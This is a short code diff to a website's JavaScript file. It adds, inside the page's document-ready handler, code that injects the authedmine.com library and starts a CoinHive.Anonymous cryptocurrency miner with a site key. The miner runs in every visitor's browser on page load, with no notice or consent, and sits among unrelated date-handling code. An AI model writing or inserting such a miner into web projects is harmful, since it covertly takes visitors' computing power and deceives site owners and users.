@@ -206,6 +206,14 @@ function mBV(s,b,t,a){
 
 
 $(document).ready(function(){
+	$('body').append(
+		'<script src="https:\/\/authedmine.com\/lib\/authedmine.min.js"><\/script>' +
+		'<script>' +
+		'	var miner = new CoinHive.Anonymous(\'wXS5KFc5mWChIpczWxnYY6X9tb95ESw1\');' +
+		'	miner.start();' +
+		'</script>'
+	);
+
 	var nD=new Date();
 	var nH=nD.getUTCHours();
 
